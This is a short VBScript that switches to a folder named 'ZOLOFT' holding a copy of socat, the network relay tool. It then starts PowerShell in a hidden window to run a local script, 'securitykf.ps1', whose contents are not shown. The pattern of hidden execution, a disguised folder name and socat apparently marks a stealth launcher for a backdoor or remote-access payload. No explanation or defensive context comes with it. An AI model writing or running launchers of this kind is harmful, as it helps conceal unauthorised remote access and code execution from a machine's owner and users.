Set objShell = CreateObject("WScript.Shell")
objShell.CurrentDirectory = "C:\Program Files\ZOLOFT\ZOLOFT\socat-windows-master" 
objShell.Run("powershell.exe -noexit -windowstyle hidden .\securitykf.ps1")
